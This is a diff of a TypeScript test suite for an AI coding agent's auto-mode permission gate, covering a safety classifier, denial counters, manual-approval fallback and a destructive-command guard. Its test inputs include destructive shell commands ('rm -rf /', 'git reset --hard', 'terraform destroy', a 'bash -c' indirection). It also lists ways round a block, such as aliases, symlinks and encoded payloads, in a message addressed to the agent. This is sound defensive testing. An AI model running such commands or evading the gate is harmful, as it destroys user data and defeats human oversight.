@@ -997,15 +681,7 @@ describe('shouldForceAutoModeReviewForAllow', () => {
       "perl -e 'print $_' /tmp/file",
       "sed -n '1,10p' .qwen/settings.json",
     ]) {
-      expect(
-        shouldForceAutoModeReviewForAllow(
-          ctx({
-            toolName: ToolNames.SHELL,
-            command,
-            cwd: '/repo',
-          }),
-        ),
-      ).toBe(false);
+      expect(forcesReview(command)).toBe(false);
     }
   });
 
@@ -1022,167 +698,185 @@ describe('shouldForceAutoModeReviewForAllow', () => {
   });
 
   it('returns false for ordinary edits and non-edit tools', () => {
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({ toolName: ToolNames.EDIT, filePath: '/repo/src/index.ts' }),
-      ),
-    ).toBe(false);
+    expect(forcesReviewOf(ToolNames.EDIT, '/repo/src/index.ts')).toBe(false);
 
     expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.READ_FILE,
-          filePath: '/repo/.qwen/settings.json',
-        }),
-      ),
+      forcesReviewOf(ToolNames.READ_FILE, '/repo/.qwen/settings.json'),
     ).toBe(false);
 
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'echo "ok" > src/output.txt',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(false);
+    expect(forcesReview('echo "ok" > src/output.txt')).toBe(false);
 
-    expect(
-      shouldForceAutoModeReviewForAllow(
-        ctx({
-          toolName: ToolNames.SHELL,
-          command: 'cd src && echo "ok" > output.txt',
-          cwd: '/repo',
-        }),
-      ),
-    ).toBe(false);
+    expect(forcesReview('cd src && echo "ok" > output.txt')).toBe(false);
   });
 });
 
 // ─── evaluateAutoMode gating ─────────────────────────────────────────────
 
+const PROJECT = '/Users/test/project';
+const onFile = (toolName: string, filePath: string) => ({ toolName, filePath });
+
+/** evaluateAutoMode for `ctx` in a workspace rooted at PROJECT: no ask rule,
+ * no tool params, no history; `extra` overrides any of these. */
+function evaluate(
+  ctx: PermissionCheckContext,
+  extra: Partial<Parameters<typeof evaluateAutoMode>[0]> = {},
+) {
+  return evaluateAutoMode({
+    ctx,
+    pmForcedAsk: false,
+    toolParams: {},
+    messages: [],
+    config: makeConfig([PROJECT]),
+    signal: new AbortController().signal,
+    ...extra,
+  });
+}
+
+const counters = (
+  consecutiveBlock: number,
+  consecutiveUnavailable: number,
+  totalBlock: number,
+  totalUnavailable: number,
+) => ({
+  consecutiveBlock,
+  consecutiveUnavailable,
+  totalBlock,
+  totalUnavailable,
+});
+
+type ClassifierVerdict = Extract<
+  Parameters<typeof applyAutoModeDecision>[0],
+  { via: 'classifier' }
+>;
+/** A classifier verdict: a fast-stage policy block unless overridden. */
+const verdict = (o: Partial<ClassifierVerdict> = {}): ClassifierVerdict => ({
+  via: 'classifier',
+  shouldBlock: true,
+  reason: 'unsafe command',
+  unavailable: false,
+  stage: 'fast',
+  durationMs: 10,
+  ...o,
+});
+
+/** applyAutoModeDecision with a spy as the config's setAutoModeDenialState. */
+function apply(
+  decision: Parameters<typeof applyAutoModeDecision>[0],
+  state: Parameters<typeof applyAutoModeDecision>[2],
+  actionFingerprint?: string,
+) {
+  const setAutoModeDenialState = vi.fn();
+  const config = { setAutoModeDenialState } as unknown as Config;
+  const result = applyAutoModeDecision(
+    decision,
+    config,
+    state,
+    actionFingerprint,
+  );
+  return { result, setAutoModeDenialState };
+}
+
 describe('evaluateAutoMode — fast-path gating', () => {
-  const cwd = '/Users/test/project';
-  const baseConfig = makeConfig([cwd]);
+  const cwd = PROJECT;
 
   it('fires L5.1 acceptEdits fast-path when pmForcedAsk=false', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.EDIT, filePath: `${cwd}/src/x.ts` },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluate(onFile(ToolNames.EDIT, `${cwd}/src/x.ts`));
     expect(decision.via).toBe('fast-path:accept-edits');
   });
 
   it('fires L5.2 allowlist fast-path when pmForcedAsk=false', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.READ_FILE, filePath: '/anywhere/x.ts' },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluate(
+      onFile(ToolNames.READ_FILE, '/anywhere/x.ts'),
+    );
     expect(decision.via).toBe('fast-path:allowlist');
   });
 
   it('routes to manual fallback (skipping classifier) when pmForcedAsk=true', async () => {
-    // User wrote an explicit ask rule — fast-paths AND classifier must be
-    // skipped. The PR auto-mode.md doc states "ask rules force manual
-    // confirmation"; without this leg, the classifier could approve and
-    // silently override the user's explicit intent.
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.EDIT, filePath: `${cwd}/src/x.ts` },
+    // An explicit user ask rule must skip fast-paths AND classifier
+    // (auto-mode.md: "ask rules force manual confirmation"); otherwise the
+    // classifier could approve and silently override the user's intent.
+    const decision = await evaluate(onFile(ToolNames.EDIT, `${cwd}/src/x.ts`), {
       pmForcedAsk: true,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
     });
     expect(decision).toEqual({ via: 'fallback', reason: 'ask_rule' });
   });
 
   it('routes to fallback with the denialTracking reason when armed', async () => {
-    // Regression guard: when denialTracking has already armed a fallback
-    // (3 consecutive blocks / 2 consecutive unavailables), the scheduler
-    // passes the specific reason so the in-progress call drops to manual
-    // approval without burning another classifier request. Fast paths still
-    // fire — only the classifier dispatch is suppressed. Tool here is SHELL
-    // (not on the allowlist, not an edit), so neither fast-path applies;
-    // without skipClassifierReason this would dispatch the classifier.
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.SHELL, command: 'rm -rf /' },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
-      skipClassifierReason: 'total_denial',
-    });
+    // Regression guard: once denialTracking armed a fallback (3 consecutive
+    // blocks / 2 consecutive unavailables) the scheduler passes the reason, so
+    // the call drops to manual approval without another classifier request.
+    // Only the classifier dispatch is suppressed (fast paths still fire);
+    // SHELL hits neither fast-path, so without skipClassifierReason it would
+    // dispatch the classifier.
+    const decision = await evaluate(
+      { toolName: ToolNames.SHELL, command: 'rm -rf /' },
+      { skipClassifierReason: 'total_denial' },
+    );
     expect(decision).toEqual({ via: 'fallback', reason: 'total_denial' });
   });
 
   // ─── New tests for external write fallback ───
   it('routes external EDIT to manual fallback before classifier', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: {
-        toolName: ToolNames.EDIT,
-        filePath: '/Users/test/other-project/x.ts',
-      },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluate(
+      onFile(ToolNames.EDIT, '/Users/test/other-project/x.ts'),
+    );
     expect(decision).toEqual({ via: 'fallback', reason: 'external_write' });
   });
 
   it('routes external WRITE_FILE to manual fallback before classifier', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: {
-        toolName: ToolNames.WRITE_FILE,
-        filePath: '/etc/hosts',
-      },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluate(onFile(ToolNames.WRITE_FILE, '/etc/hosts'));
     expect(decision).toEqual({ via: 'fallback', reason: 'external_write' });
   });
 
   it('routes external NOTEBOOK_EDIT to manual fallback before classifier', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: {
-        toolName: ToolNames.NOTEBOOK_EDIT,
-        filePath: '/users/test/other-project/nb.ipynb',
-      },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluate(
+      onFile(ToolNames.NOTEBOOK_EDIT, '/users/test/other-project/nb.ipynb'),
+    );
     expect(decision).toEqual({ via: 'fallback', reason: 'external_write' });
   });
 
-  it('routes in-workspace protected writes to classifier', async () => {
+  it.each([ToolNames.SHELL, ToolNames.MONITOR])(
+    'routes %s with a directory outside the workspace to manual fallback before classifier',
+    async (toolName) => {
+      const decision = await evaluateAutoMode({
+        ctx: {
+          toolName,
+          command: 'npm run build',
+          cwd: '/Users/test/other-project',
+        },
+        pmForcedAsk: false,
+        toolParams: {},
+        messages: [],
+        config: makeConfig([cwd]),
+        signal: new AbortController().signal,
+      });
+      expect(decision).toEqual({
+        via: 'fallback',
+        reason: 'external_directory',
+      });
+    },
+  );
+
+  it('routes a shell directory inside the workspace to classifier', async () => {
     const decision = await evaluateAutoMode({
       ctx: {
-        toolName: ToolNames.EDIT,
-        filePath: `${cwd}/.qwen/settings.json`,
+        toolName: ToolNames.SHELL,
+        command: 'npm run build',
+        cwd: `${cwd}/packages/app`,
       },
       pmForcedAsk: false,
       toolParams: {},
       messages: [],
-      config: baseConfig,
+      config: makeConfig([cwd]),
       signal: new AbortController().signal,
     });
+    expect(decision.via).toBe('classifier');
+  });
+
+  it('routes in-workspace protected writes to classifier', async () => {
+    const decision = await evaluate(
+      onFile(ToolNames.EDIT, `${cwd}/.qwen/settings.json`),
+    );
     expect(decision.via).toBe('classifier');
   });
 });
@@ -1190,58 +884,22 @@ describe('evaluateAutoMode — fast-path gating', () => {
 // ─── applyAutoModeDecision reason mapping ────────────────────────────────
 
 describe('applyAutoModeDecision — blocked reason mapping', () => {
-  const denialState = {
-    consecutiveBlock: 0,
-    consecutiveUnavailable: 0,
-    totalBlock: 0,
-    totalUnavailable: 0,
-  };
+  const denialState = counters(0, 0, 0, 0);
 
   it('maps classifier policy blocks to classifier_blocked', () => {
-    const setAutoModeDenialState = vi.fn();
-    const result = applyAutoModeDecision(
-      {
-        via: 'classifier',
-        shouldBlock: true,
-        reason: 'unsafe command',
-        unavailable: false,
-        stage: 'fast',
-        durationMs: 10,
-      },
-      { setAutoModeDenialState } as unknown as Config,
-      denialState,
-    );
+    const { result, setAutoModeDenialState } = apply(verdict(), denialState);
 
     expect(result).toMatchObject({
       kind: 'blocked',
       reason: 'classifier_blocked',
     });
-    expect(setAutoModeDenialState).toHaveBeenCalledWith({
-      consecutiveBlock: 1,
-      consecutiveUnavailable: 0,
-      totalBlock: 1,
-      totalUnavailable: 0,
-    });
+    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(1, 0, 1, 0));
   });
 
   it('routes the block that reaches the consecutive limit to manual approval', () => {
-    const setAutoModeDenialState = vi.fn();
-    const result = applyAutoModeDecision(
-      {
-        via: 'classifier',
-        shouldBlock: true,
-        reason: 'unsafe command',
-        unavailable: false,
-        stage: 'fast',
-        durationMs: 10,
-      },
-      { setAutoModeDenialState } as unknown as Config,
-      {
-        consecutiveBlock: 2,
-        consecutiveUnavailable: 0,
-        totalBlock: 2,
-        totalUnavailable: 0,
-      },
+    const { result, setAutoModeDenialState } = apply(
+      verdict(),
+      counters(2, 0, 2, 0),
       'blocked-action',
     );
 
@@ -1249,32 +907,13 @@ describe('applyAutoModeDecision — blocked reason mapping', () => {
       kind: 'fallback',
       reason: 'consecutive_block',
     });
-    expect(setAutoModeDenialState).toHaveBeenCalledWith({
-      consecutiveBlock: 3,
-      consecutiveUnavailable: 0,
-      totalBlock: 3,
-      totalUnavailable: 0,
-    });
+    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(3, 0, 3, 0));
   });
 
   it('routes the block that reaches the total limit to manual approval', () => {
-    const setAutoModeDenialState = vi.fn();
-    const result = applyAutoModeDecision(
-      {
-        via: 'classifier',
-        shouldBlock: true,
-        reason: 'unsafe command',
-        unavailable: false,
-        stage: 'fast',
-        durationMs: 10,
-      },
-      { setAutoModeDenialState } as unknown as Config,
-      {
-        consecutiveBlock: 0,
-        consecutiveUnavailable: 0,
-        totalBlock: 19,
-        totalUnavailable: 0,
-      },
+    const { result, setAutoModeDenialState } = apply(
+      verdict(),
+      counters(0, 0, 19, 0),
       'blocked-action',
     );
 
@@ -1282,26 +921,12 @@ describe('applyAutoModeDecision — blocked reason mapping', () => {
       kind: 'fallback',
       reason: 'total_denial',
     });
-    expect(setAutoModeDenialState).toHaveBeenCalledWith({
-      consecutiveBlock: 1,
-      consecutiveUnavailable: 0,
-      totalBlock: 20,
-      totalUnavailable: 0,
-    });
+    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(1, 0, 20, 0));
   });
 
   it('routes classifier infrastructure failures to manual approval', () => {
-    const setAutoModeDenialState = vi.fn();
-    const result = applyAutoModeDecision(
-      {
-        via: 'classifier',
-        shouldBlock: true,
-        reason: 'timeout',
-        unavailable: true,
-        stage: 'thinking',
-        durationMs: 10,
-      },
-      { setAutoModeDenialState } as unknown as Config,
+    const { result, setAutoModeDenialState } = apply(
+      verdict({ reason: 'timeout', unavailable: true, stage: 'thinking' }),
       denialState,
     );
 
@@ -1310,48 +935,22 @@ describe('applyAutoModeDecision — blocked reason mapping', () => {
       reason: 'classifier_unavailable',
       message: expect.stringContaining('Switching to Default Mode'),
     });
-    expect(setAutoModeDenialState).toHaveBeenCalledWith({
-      consecutiveBlock: 0,
-      consecutiveUnavailable: 1,
-      totalBlock: 0,
-      totalUnavailable: 1,
-    });
+    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(0, 1, 0, 1));
   });
 
   it('allows classifier approvals and resets consecutive counters', () => {
-    const setAutoModeDenialState = vi.fn();
-    const result = applyAutoModeDecision(
-      {
-        via: 'classifier',
-        shouldBlock: false,
-        reason: 'safe command',
-        unavailable: false,
-        stage: 'fast',
-        durationMs: 10,
-      },
-      { setAutoModeDenialState } as unknown as Config,
-      {
-        consecutiveBlock: 1,
-        consecutiveUnavailable: 2,
-        totalBlock: 3,
-        totalUnavailable: 4,
-      },
+    const { result, setAutoModeDenialState } = apply(
+      verdict({ shouldBlock: false, reason: 'safe command' }),
+      counters(1, 2, 3, 4),
     );
 
     expect(result).toEqual({ kind: 'approved' });
-    expect(setAutoModeDenialState).toHaveBeenCalledWith({
-      consecutiveBlock: 0,
-      consecutiveUnavailable: 0,
-      totalBlock: 3,
-      totalUnavailable: 4,
-    });
+    expect(setAutoModeDenialState).toHaveBeenCalledWith(counters(0, 0, 3, 4));
   });
 
   it('passes through fallback reason without mutating denial state', () => {
-    const setAutoModeDenialState = vi.fn();
-    const result = applyAutoModeDecision(
+    const { result, setAutoModeDenialState } = apply(
       { via: 'fallback', reason: 'consecutive_block' },
-      { setAutoModeDenialState } as unknown as Config,
       denialState,
     );
 
@@ -1362,12 +961,26 @@ describe('applyAutoModeDecision — blocked reason mapping', () => {
     expect(setAutoModeDenialState).not.toHaveBeenCalled();
   });
 
-  it('consumes a matching retry token when a threshold fallback takes precedence', () => {
+  it('explains an outside-directory fallback in the approval prompt', () => {
     const setAutoModeDenialState = vi.fn();
-    const actionFingerprint = 'same-action';
     const result = applyAutoModeDecision(
-      { via: 'fallback', reason: 'consecutive_block' },
+      { via: 'fallback', reason: 'external_directory' },
       { setAutoModeDenialState } as unknown as Config,
+      denialState,
+    );
+
+    expect(result).toEqual({
+      kind: 'fallback',
+      reason: 'external_directory',
+      message:
+        'Commands outside the workspace require manual approval in AUTO mode.',
+    });
+  });
+
+  it('consumes a matching retry token when a threshold fallback takes precedence', () => {
+    const actionFingerprint = 'same-action';
+    const { result, setAutoModeDenialState } = apply(
+      { via: 'fallback', reason: 'consecutive_block' },
       {
         ...denialState,
         consecutiveBlock: 3,
@@ -1404,20 +1017,15 @@ describe('formatClassifierBlockMessage', () => {
   // Shared between coreToolScheduler.ts and acp-integration/session/
   // Session.ts. Drift between the two used to give CLI vs ACP users
   // different diagnostics for the same failure — guard it once.
-  const baseDecision = {
-    via: 'classifier' as const,
-    shouldBlock: true,
-    stage: 'thinking' as const,
-    durationMs: 100,
-  };
-
   it('renders a policy-block message including the reason', () => {
     expect(
-      formatClassifierBlockMessage({
-        ...baseDecision,
-        reason: 'Irreversible filesystem destruction',
-        unavailable: false,
-      }),
+      formatClassifierBlockMessage(
+        verdict({
+          stage: 'thinking',
+          durationMs: 100,
+          reason: 'Irreversible filesystem destruction',
+        }),
+      ),
     ).toBe(
       'Blocked by auto mode policy: Irreversible filesystem destruction\nDo not try to complete the denied action through another tool, shell indirection, generated script, alias, symlink, config change, hook, command file, MCP configuration, encoded payload, or equivalent path. To request manual approval for this exact action, retry the same tool call without changing its arguments. You may continue with unrelated safe work or a genuinely safer alternative that does not accomplish the denied action.',
     );
@@ -1425,20 +1033,16 @@ describe('formatClassifierBlockMessage', () => {
 });
 
 describe('classifier unavailable confirmation', () => {
-  const baseDecision = {
-    via: 'classifier' as const,
-    shouldBlock: true,
-    stage: 'thinking' as const,
-    durationMs: 100,
-    unavailable: true,
-  };
-
   it('renders a manual fallback message with the cause and recommendation', () => {
     expect(
-      formatClassifierUnavailableFallbackMessage({
-        ...baseDecision,
-        reason: 'Conversation transcript exceeds classifier context window',
-      }),
+      formatClassifierUnavailableFallbackMessage(
+        verdict({
+          stage: 'thinking',
+          durationMs: 100,
+          unavailable: true,
+          reason: 'Conversation transcript exceeds classifier context window',
+        }),
+      ),
     ).toBe(
       "Auto Mode couldn't classify this action (Conversation transcript exceeds classifier context window). Review it manually. Switching to Default Mode is recommended if you want to continue without the classifier.",
     );
@@ -1486,18 +1090,19 @@ describe('classifier unavailable confirmation', () => {
 // ─── PermissionDenied hook gating ────────────────────────────────────────
 
 describe('PermissionDenied hook gating', () => {
-  const classifierBlock = {
-    via: 'classifier' as const,
-    shouldBlock: true,
+  const classifierBlock = verdict({
     reason: 'Dangerous shell command',
-    unavailable: false,
-    stage: 'fast' as const,
     durationMs: 20,
-  };
+  });
 
   it('fires for classifier policy blocks, including threshold fallbacks', () => {
+    const fires = shouldFirePermissionDeniedForAutoMode;
+    type Outcome = Parameters<typeof fires>[1];
+    const review = (reason: string) =>
+      ({ kind: 'fallback', reason, message: 'Review manually.' }) as Outcome;
+
     expect(
-      shouldFirePermissionDeniedForAutoMode(classifierBlock, {
+      fires(classifierBlock, {
         kind: 'blocked',
         errorMessage: 'blocked',
         reason: 'classifier_blocked',
@@ -1505,14 +1110,11 @@ describe('PermissionDenied hook gating', () => {
     ).toBe(true);
 
     expect(
-      shouldFirePermissionDeniedForAutoMode(
-        { ...classifierBlock, shouldBlock: false },
-        { kind: 'approved' },
-      ),
+      fires({ ...classifierBlock, shouldBlock: false }, { kind: 'approved' }),
     ).toBe(false);
 
     expect(
-      shouldFirePermissionDeniedForAutoMode(
+      fires(
         { ...classifierBlock, unavailable: true },
         {
           kind: 'fallback',
@@ -1522,39 +1124,20 @@ describe('PermissionDenied hook gating', () => {
       ),
     ).toBe(false);
 
-    expect(
-      shouldFirePermissionDeniedForAutoMode(classifierBlock, {
-        kind: 'fallback',
-        reason: 'consecutive_block',
-        message: 'Review manually.',
-      }),
-    ).toBe(true);
+    expect(fires(classifierBlock, review('consecutive_block'))).toBe(true);
+
+    expect(fires(classifierBlock, review('total_denial'))).toBe(true);
+
+    expect(fires(classifierBlock, review('classifier_blocked_retry'))).toBe(
+      false,
+    );
 
     expect(
-      shouldFirePermissionDeniedForAutoMode(classifierBlock, {
-        kind: 'fallback',
-        reason: 'total_denial',
-        message: 'Review manually.',
-      }),
-    ).toBe(true);
-
-    expect(
-      shouldFirePermissionDeniedForAutoMode(classifierBlock, {
-        kind: 'fallback',
-        reason: 'classifier_blocked_retry',
-        message: 'Review manually.',
-      }),
+      fires(classifierBlock, { kind: 'fallback', reason: 'safety_check' }),
     ).toBe(false);
 
     expect(
-      shouldFirePermissionDeniedForAutoMode(classifierBlock, {
-        kind: 'fallback',
-        reason: 'safety_check',
-      }),
-    ).toBe(false);
-
-    expect(
-      shouldFirePermissionDeniedForAutoMode(
+      fires(
         { via: 'fallback', reason: 'safety_check' },
         { kind: 'fallback', reason: 'safety_check' },
       ),
@@ -1578,10 +1161,9 @@ describe('PermissionDenied hook gating', () => {
 // ─── shouldRunAutoModeForCall ─────────────────────────────────────────────
 
 describe('shouldRunAutoModeForCall', () => {
-  // Security-critical gate. Drift here would either silently skip AUTO
-  // for tools that need it (false negative — bypass) or invoke the
-  // classifier on tools that must always reach the user
-  // (false positive — UX break for ask_user_question / exit_plan_mode).
+  // Security-critical gate. Drift would either skip AUTO for tools that need it
+  // (false negative: bypass) or classify tools that must always reach the user
+  // (false positive: UX break for ask_user_question / exit_plan_mode).
 
   it('returns false when approval mode is not AUTO', () => {
     for (const mode of [
@@ -1608,22 +1190,19 @@ describe('shouldRunAutoModeForCall', () => {
     }
   });
 
+  const underAuto = (tool: string) =>
+    shouldRunAutoModeForCall(ApprovalMode.AUTO, tool);
+
   it('excludes ASK_USER_QUESTION even under AUTO — must always reach the user', () => {
-    expect(
-      shouldRunAutoModeForCall(ApprovalMode.AUTO, ToolNames.ASK_USER_QUESTION),
-    ).toBe(false);
+    expect(underAuto(ToolNames.ASK_USER_QUESTION)).toBe(false);
   });
 
   it('excludes EXIT_PLAN_MODE even under AUTO — plan exits are operator-driven', () => {
-    expect(
-      shouldRunAutoModeForCall(ApprovalMode.AUTO, ToolNames.EXIT_PLAN_MODE),
-    ).toBe(false);
+    expect(underAuto(ToolNames.EXIT_PLAN_MODE)).toBe(false);
   });
 
   it('excludes ENTER_PLAN_MODE even under AUTO — plan entries are always allowed without classification', () => {
-    expect(
-      shouldRunAutoModeForCall(ApprovalMode.AUTO, ToolNames.ENTER_PLAN_MODE),
-    ).toBe(false);
+    expect(underAuto(ToolNames.ENTER_PLAN_MODE)).toBe(false);
   });
 
   it('returns false for unknown tool names when not in AUTO', () => {
@@ -1636,37 +1215,21 @@ describe('shouldRunAutoModeForCall', () => {
 // ─── shouldClassifyAllShellForAutoMode ────────────────────────────────────
 
 describe('shouldClassifyAllShellForAutoMode', () => {
-  function configWithClassifyAllShell(enabled: boolean): Config {
-    return {
+  const classifiesAll = (tool: string, enabled: boolean) =>
+    shouldClassifyAllShellForAutoMode(tool, {
       getAutoModeSettings: () => ({ classifyAllShell: enabled }),
-    } as unknown as Config;
-  }
+    } as unknown as Config);
 
   it('returns true for Shell when classifyAllShell is enabled', () => {
-    expect(
-      shouldClassifyAllShellForAutoMode(
-        ToolNames.SHELL,
-        configWithClassifyAllShell(true),
-      ),
-    ).toBe(true);
+    expect(classifiesAll(ToolNames.SHELL, true)).toBe(true);
   });
 
   it('returns true for Monitor when classifyAllShell is enabled', () => {
-    expect(
-      shouldClassifyAllShellForAutoMode(
-        ToolNames.MONITOR,
-        configWithClassifyAllShell(true),
-      ),
-    ).toBe(true);
+    expect(classifiesAll(ToolNames.MONITOR, true)).toBe(true);
   });
 
   it('returns false for Shell when classifyAllShell is disabled', () => {
-    expect(
-      shouldClassifyAllShellForAutoMode(
-        ToolNames.SHELL,
-        configWithClassifyAllShell(false),
-      ),
-    ).toBe(false);
+    expect(classifiesAll(ToolNames.SHELL, false)).toBe(false);
   });
 
   it('returns false for non-shell tools even when classifyAllShell is enabled', () => {
@@ -1676,12 +1239,7 @@ describe('shouldClassifyAllShellForAutoMode', () => {
       ToolNames.READ_FILE,
       ToolNames.WEB_FETCH,
     ]) {
-      expect(
-        shouldClassifyAllShellForAutoMode(
-          tool,
-          configWithClassifyAllShell(true),
-        ),
-      ).toBe(false);
+      expect(classifiesAll(tool, true)).toBe(false);
     }
   });
 
@@ -1698,22 +1256,18 @@ describe('shouldClassifyAllShellForAutoMode', () => {
 // ─── L5.2.5 destructive command guard integration ────────────────────────
 
 describe('evaluateAutoMode — L5.2.5 destructive command guard', () => {
-  const cwd = '/Users/test/project';
-  const baseConfig = makeConfig([cwd]);
+  const cwd = PROJECT;
+  const shell = (command: string) => ({ toolName: ToolNames.SHELL, command });
+  /** A Shell `command` evaluated after a user turn saying `prompt`. */
+  const evaluateShell = (command: string, prompt: string) =>
+    evaluate(shell(command), { messages: [userText(prompt)] });
 
   beforeEach(() => {
     clearSessionCommits();
   });
 
   it('blocks git reset --hard via shell tool before classifier', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.SHELL, command: 'git reset --hard' },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [{ role: 'user', parts: [{ text: 'fix the bug' }] }],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluateShell('git reset --hard', 'fix the bug');
     expect(decision.via).toBe('blocked:destructive-command');
     if (decision.via === 'blocked:destructive-command') {
       expect(decision.reason).toContain('git reset --hard');
@@ -1721,36 +1275,16 @@ describe('evaluateAutoMode — L5.2.5 destructive command guard', () => {
   });
 
   it('blocks terraform destroy via shell tool', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: {
-        toolName: ToolNames.SHELL,
-        command: 'terraform destroy',
-      },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [{ role: 'user', parts: [{ text: 'update infra' }] }],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluateShell('terraform destroy', 'update infra');
     expect(decision.via).toBe('blocked:destructive-command');
   });
 
   it('allows destructive commands when user explicitly mentions discard', async () => {
-    // With "discard" in the prompt, the guard should NOT block.
-    // The call will fall through to the classifier (which is mocked away
-    // here — we just verify it doesn't get blocked:destructive-command).
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.SHELL, command: 'git reset --hard' },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [
-        {
-          role: 'user',
-          parts: [{ text: 'discard all local changes and reset' }],
-        },
-      ],
-      config: baseConfig,
-      signal: new AbortController().signal,
+    // With "discard" in the prompt, the guard should NOT block. The call falls
+    // through to the classifier (mocked away here — we only verify it is not
+    // blocked:destructive-command).
+    const decision = await evaluate(shell('git reset --hard'), {
+      messages: [userText('discard all local changes and reset')],
       skipClassifierReason: 'total_denial',
     });
     // Should NOT be blocked:destructive-command; instead falls through
@@ -1765,14 +1299,11 @@ describe('evaluateAutoMode — L5.2.5 destructive command guard', () => {
       cwd,
     );
     let denialState = {
-      consecutiveBlock: 1,
-      consecutiveUnavailable: 0,
-      totalBlock: 1,
-      totalUnavailable: 0,
+      ...counters(1, 0, 1, 0),
       pendingManualRetryFingerprint: actionFingerprint,
     };
     const config = {
-      ...baseConfig,
+      ...makeConfig([cwd]),
       getAutoModeDenialState: () => denialState,
       setAutoModeDenialState: (next: typeof denialState) => {
         denialState = next;
@@ -1780,13 +1311,10 @@ describe('evaluateAutoMode — L5.2.5 destructive command guard', () => {
     } as unknown as Config;
     const prepared = prepareAutoModeFallback(config, actionFingerprint);
 
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.SHELL, command: 'git reset --hard' },
-      pmForcedAsk: false,
+    const decision = await evaluate(shell('git reset --hard'), {
       toolParams: { command: 'git reset --hard' },
-      messages: [{ role: 'user', parts: [{ text: 'fix the bug' }] }],
+      messages: [userText('fix the bug')],
       config,
-      signal: new AbortController().signal,
       skipClassifierReason: prepared.fallback.fallback
         ? prepared.fallback.reason
         : undefined,
@@ -1803,47 +1331,28 @@ describe('evaluateAutoMode — L5.2.5 destructive command guard', () => {
   });
 
   it('does not block non-shell tools', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: { toolName: ToolNames.READ_FILE, filePath: '/any/file.txt' },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [{ role: 'user', parts: [{ text: 'read the file' }] }],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluate(
+      onFile(ToolNames.READ_FILE, '/any/file.txt'),
+      { messages: [userText('read the file')] },
+    );
     expect(decision.via).toBe('fast-path:allowlist');
   });
 
   it('blocks shell indirection: bash -c "git reset --hard"', async () => {
-    const decision = await evaluateAutoMode({
-      ctx: {
-        toolName: ToolNames.SHELL,
-        command: 'bash -c "git reset --hard"',
-      },
-      pmForcedAsk: false,
-      toolParams: {},
-      messages: [{ role: 'user', parts: [{ text: 'fix something' }] }],
-      config: baseConfig,
-      signal: new AbortController().signal,
-    });
+    const decision = await evaluateShell(
+      'bash -c "git reset --hard"',
+      'fix something',
+    );
     expect(decision.via).toBe('blocked:destructive-command');
   });
 
   it('applyAutoModeDecision handles blocked:destructive-command', () => {
-    const setAutoModeDenialState = vi.fn();
-    const denialState = {
-      consecutiveBlock: 0,
-      consecutiveUnavailable: 0,
-      totalBlock: 0,
-      totalUnavailable: 0,
-    };
-    const result = applyAutoModeDecision(
+    const { result, setAutoModeDenialState } = apply(
       {
         via: 'blocked:destructive-command',
         reason: 'Blocked destructive git command',
       },
-      { setAutoModeDenialState } as unknown as Config,
-      denialState,
+      counters(0, 0, 0, 0),
     );
     expect(result.kind).toBe('blocked');
     if (result.kind === 'blocked') {
